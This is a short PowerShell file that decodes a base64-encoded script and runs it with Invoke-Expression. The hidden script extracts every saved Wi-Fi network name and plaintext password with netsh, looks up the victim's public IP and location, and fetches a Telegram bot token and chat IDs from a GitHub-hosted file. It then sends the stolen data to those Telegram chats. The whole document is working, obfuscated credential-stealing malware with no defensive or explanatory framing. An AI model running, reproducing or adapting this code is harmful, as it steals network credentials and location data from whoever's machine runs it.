$encodedScript = 'IyBGdW5jdGlvbiB0byBnZXQgV0xBTiBwcm9maWxlcw0KZnVuY3Rpb24gR2V0LVdMQU5fUHJvZmlsZXMgew0KICAgIHBhcmFtICgNCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdlcy1FUycsJ2VuLUVOJyldDQogICAgICAgICRMQU5HVUFHRSA9ICRIb3N0LkN1cnJlbnRVSUN1bHR1cmUuTmFtZQ0KICAgICkNCg0KICAgICRMQU5HVUFHRVMgPSBAew0KICAgICAgICAnZXMtRVMnID0gQHsNCiAgICAgICAgICAgICd1c2VyX3Byb2ZpbGVzX3RleHQnICAgICAgID0gJ1BlcmZpbCBkZSB0b2RvcyBsb3MgdXN1YXJpb3MnDQogICAgICAgICAgICAncHJvZmlsZV9ub3RfZm91bmRfdGV4dCcgICA9ICdObyBzZSBlbmN1ZW50cmEgZWwgcGVyZmlsJw0KICAgICAgICAgICAgJ3NzaWRfbmFtZV90ZXh0JyAgICAgICAgICAgPSAnTm9tYnJlIGRlIFNTSUQnDQogICAgICAgICAgICAnbmV0d29ya190eXBlX3RleHQnICAgICAgICA9ICdUaXBvIGRlIHJlZCcNCiAgICAgICAgICAgICdhdXRoZW50aWNhdGlvbl90ZXh0JyAgICAgID0gJ0F1dGVudGljYWNpw7NuJw0KICAgICAgICAgICAgJ2VuY3J5cHRpb25fdGV4dCcgICAgICAgICAgPSAnQ2lmcmFkbycNCiAgICAgICAgICAgICdrZXlfdGV4dCcgICAgICAgICAgICAgICAgID0gJ0NvbnRlbmlkbyBkZSBsYSBjbGF2ZScNCiAgICAgICAgfQ0KICAgICAgICAnZW4tRU4nID0gQHsNCiAgICAgICAgICAgICd1c2VyX3Byb2ZpbGVzX3RleHQnICAgICAgID0gJ0FsbCBVc2VyIFByb2ZpbGUnDQogICAgICAgICAgICAncHJvZmlsZV9ub3RfZm91bmRfdGV4dCcgICA9ICdQcm9maWxlIG5vdCBmb3VuZCcNCiAgICAgICAgICAgICdzc2lkX25hbWVfdGV4dCcgICAgICAgICAgID0gJ1NTSUQgbmFtZScNCiAgICAgICAgICAgICduZXR3b3JrX3R5cGVfdGV4dCcgICAgICAgID0gJ05ldHdvcmsgVHlwZScNCiAgICAgICAgICAgICdhdXRoZW50aWNhdGlvbl90ZXh0JyAgICAgID0gJ0F1dGhlbnRpY2F0aW9uJw0KICAgICAgICAgICAgJ2VuY3J5cHRpb25fdGV4dCcgICAgICAgICAgPSAnQ2lwaGVyJw0KICAgICAgICAgICAgJ2tleV90ZXh0JyAgICAgICAgICAgICAgICAgPSAnS2V5IENvbnRlbnQnDQogICAgICAgIH0NCiAgICB9DQoNCiAgICAkTEFORyA9ICRMQU5HVUFHRVMuIiRMQU5HVUFHRSINCg0KICAgIGZ1bmN0aW9uIEdldFZhbHVlQnlOYW1lICgkaW5wdXRUZXh0LCAkbmFtZVN0cmluZykgew0KICAgICAgICBpZiAoJGlucHV0VGV4dCAtbWF0Y2ggIlxiJG5hbWVTdHJpbmdcYiIpIHsNCiAgICAgICAgICAgIHJldHVybiAkaW5wdXRUZXh0IC1yZXBsYWNlICJeW146XSo6ICIsIiIgLXJlcGxhY2UgJ1xzKiQnDQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICIiDQogICAgfQ0KDQogICAgJFByb2ZpbGVzID0gbmV0c2ggd2xhbiBzaG93IHByb2ZpbGVzIHwgRm9yRWFjaC1PYmplY3Qgew0KICAgICAgICBHZXRWYWx1ZUJ5TmFtZSAkXyAkTEFOR1sndXNlcl9wcm9maWxlc190ZXh0J10NCiAgICB9DQoNCiAgICAkV0xBTl9Qcm9maWxlcyA9IEAoKQ0KDQogICAgJFByb2ZpbGVzIHwgRm9yRWFjaC1PYmplY3Qgew0KICAgICAgICAkd2xhbl9Qcm9maWxlID0gbmV0c2ggd2xhbiBzaG93IHByb2ZpbGUgJF8ga2V5PWNsZWFyDQoNCiAgICAgICAgaWYgKCR3bGFuX1Byb2ZpbGUgLWNvbnRhaW5zICRMQU5HWydwcm9maWxlX25vdF9mb3VuZF90ZXh0J10pIHsNCiAgICAgICAgICAgIHJldHVybg0KICAgICAgICB9DQoNCiAgICAgICAgJEludGVyZmFjZU5hbWUgPSBHZXRWYWx1ZUJ5TmFtZSAkd2xhbl9Qcm9maWxlICRMQU5HWydzc2lkX25hbWVfdGV4dCddDQoNCiAgICAgICAgaWYgKCRJbnRlcmZhY2VOYW1lKSB7DQogICAgICAgICAgICAkSW50ZXJmYWNlTmFtZSA9ICRJbnRlcmZhY2VOYW1lLlRyaW0oJyInKQ0KDQogICAgICAgICAgICAjIENvcnJlZ2lyIGNhcmFjdGVyZXMgZXNwZWNpYWxlcyBzaSBlcyBuZWNlc2FyaW8NCiAgICAgICAgICAgICRJbnRlcmZhY2VOYW1lID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6R2V0RW5jb2RpbmcoIklTTy04ODU5LTEiKS5HZXRCeXRlcygkSW50ZXJmYWNlTmFtZSkpDQoNCiAgICAgICAgICAgICRXTEFOX1Byb2ZpbGVzICs9IFtQU0N1c3RvbU9iamVjdF1Aew0KICAgICAgICAgICAgICAgIFNTSUQgICAgICAgICAgID0gJEludGVyZmFjZU5hbWUNCiAgICAgICAgICAgICAgICBLZXkgICAgICAgICAgICA9ICIiDQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICRLZXkgPSBHZXRWYWx1ZUJ5TmFtZSAkd2xhbl9Qcm9maWxlICRMQU5HWydrZXlfdGV4dCddDQoNCiAgICAgICAgICAgIGlmICgkS2V5KSB7DQogICAgICAgICAgICAgICAgJFdMQU5fUHJvZmlsZXNbLTFdLktleSA9ICRLZXkNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCg0KICAgIGlmICgkV0xBTl9Qcm9maWxlcy5Db3VudCAtZ3QgMCkgew0KICAgICAgICAjIE9idGVuZXIgbGEgaW5mb3JtYWNpw7NuIGRlIGxhIElQIHkgdWJpY2FjacOzbg0KICAgICAgICAkaXBJbmZvID0gSW52b2tlLVJlc3RNZXRob2QgImh0dHBzOi8vaXBpbmZvLmlvL2pzb24iDQogICAgICAgICRyZXN1bHRNZXNzYWdlID0gImByYG5JbmZvcm1hY2nDs24gZGUgSVAgeSBVYmljYWNpw7NuOmByYG4iDQogICAgICAgICRyZXN1bHRNZXNzYWdlICs9ICJJUDogJCgkaXBJbmZvLmlwKWByYG4iDQogICAgICAgICRyZXN1bHRNZXNzYWdlICs9ICJVYmljYWNpw7NuOiAkKCRpcEluZm8uY2l0eSksICQoJGlwSW5mby5yZWdpb24pLCAkKCRpcEluZm8uY291bnRyeSlgcmBuIg0KDQogICAgICAgICRXTEFOX1Byb2ZpbGVzIHwgRm9yRWFjaC1PYmplY3Qgew0KICAgICAgICAgICAgJHJlc3VsdE1lc3NhZ2UgKz0gImByYG5TU0lEOiAkKCRfLlNTSUQpYHJgblBhc3N3b3JkOiAkKCRfLktleSlgcmBuIg0KICAgICAgICB9DQoNCiAgICAgICAgcmV0dXJuICRyZXN1bHRNZXNzYWdlDQogICAgfSBlbHNlIHsNCiAgICAgICAgcmV0dXJuICdObyBzZSBlbmNvbnRyYXJvbiBwZXJmaWxlcyBXTEFOLicNCiAgICB9DQp9DQoNCiMgRnVuY3Rpb24gdG8gc2VuZCBhIG1lc3NhZ2UgdG8gVGVsZWdyYW0NCmZ1bmN0aW9uIFNlbmQtVGVsZWdyYW1NZXNzYWdlIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmddJHRva2VuLA0KICAgICAgICBbc3RyaW5nXSRjaGF0SWQsDQogICAgICAgIFtzdHJpbmddJG1lc3NhZ2UNCiAgICApDQoNCiAgICAkdXJsID0gImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3QkdG9rZW4vc2VuZE1lc3NhZ2UiDQoNCiAgICAjIERpdmlkaXIgZWwgbWVuc2FqZSBlbiBwYXJ0ZXMgbcOhcyBwZXF1ZcOxYXMgKHBvciBlamVtcGxvLCBjYWRhIDQwOTYgY2FyYWN0ZXJlcykNCiAgICAkbWVzc2FnZVBhcnRzID0gW1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3Rbc3RyaW5nXV06Om5ldygpDQogICAgJG1heE1lc3NhZ2VMZW5ndGggPSA0MDk2DQoNCiAgICB3aGlsZSAoJG1lc3NhZ2UuTGVuZ3RoIC1ndCAkbWF4TWVzc2FnZUxlbmd0aCkgew0KICAgICAgICAkbWVzc2FnZVBhcnRzLkFkZCgkbWVzc2FnZS5TdWJzdHJpbmcoMCwgJG1heE1lc3NhZ2VMZW5ndGgpKQ0KICAgICAgICAkbWVzc2FnZSA9ICRtZXNzYWdlLlN1YnN0cmluZygkbWF4TWVzc2FnZUxlbmd0aCkNCiAgICB9DQogICAgJG1lc3NhZ2VQYXJ0cy5BZGQoJG1lc3NhZ2UpDQoNCiAgICBmb3JlYWNoICgkcGFydCBpbiAkbWVzc2FnZVBhcnRzKSB7DQogICAgICAgICRwYXJhbXMgPSBAew0KICAgICAgICAgICAgY2hhdF9pZCA9ICRjaGF0SWQNCiAgICAgICAgICAgIHRleHQgPSAkcGFydA0KICAgICAgICB9DQoNCiAgICAgICAgSW52b2tlLVJlc3RNZXRob2QgLVVyaSAkdXJsIC1NZXRob2QgUG9zdCAtQm9keSAkcGFyYW1zDQogICAgfQ0KfQ0KDQojIFRlbGVncmFtIGNvbmZpZ3VyYXRpb24NCiR0b2tlbkNvbmZpZyA9IEludm9rZS1SZXN0TWV0aG9kICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vUGVyaWNlbmEvaGFwcHliaXJ0aGRheS5naXRodWIuaW8vbWFpbi9kYXRvcy9jb25maWcyLnR4dCINCiRjaGF0SWRzID0gSW52b2tlLVJlc3RNZXRob2QgImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9QZXJpY2VuYS9oYXBweWJpcnRoZGF5LmdpdGh1Yi5pby9tYWluL2RhdG9zL3VzdWFyaW8vbHVpc2hpbm8udHh0Ig0KDQojIFJ1biB0aGUgR2V0LVdMQU5fUHJvZmlsZXMgZnVuY3Rpb24gYW5kIHN0b3JlIHRoZSByZXN1bHQNCiRyZXN1bHQgPSBHZXQtV0xBTl9Qcm9maWxlcw0KDQojIFNlbmQgdGhlIHJlc3VsdCBhcyBhIG1lc3NhZ2UgdG8gZWFjaCBjaGF0IElEDQpmb3JlYWNoICgkY2hhdElkIGluICRjaGF0SWRzKSB7DQogICAgU2VuZC1UZWxlZ3JhbU1lc3NhZ2UgLXRva2VuICR0b2tlbkNvbmZpZyAtY2hhdElkICRjaGF0SWQgLW1lc3NhZ2UgJHJlc3VsdA0KfQ0KDQo='
$scriptContent = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encodedScript))
Invoke-Expression $scriptContent
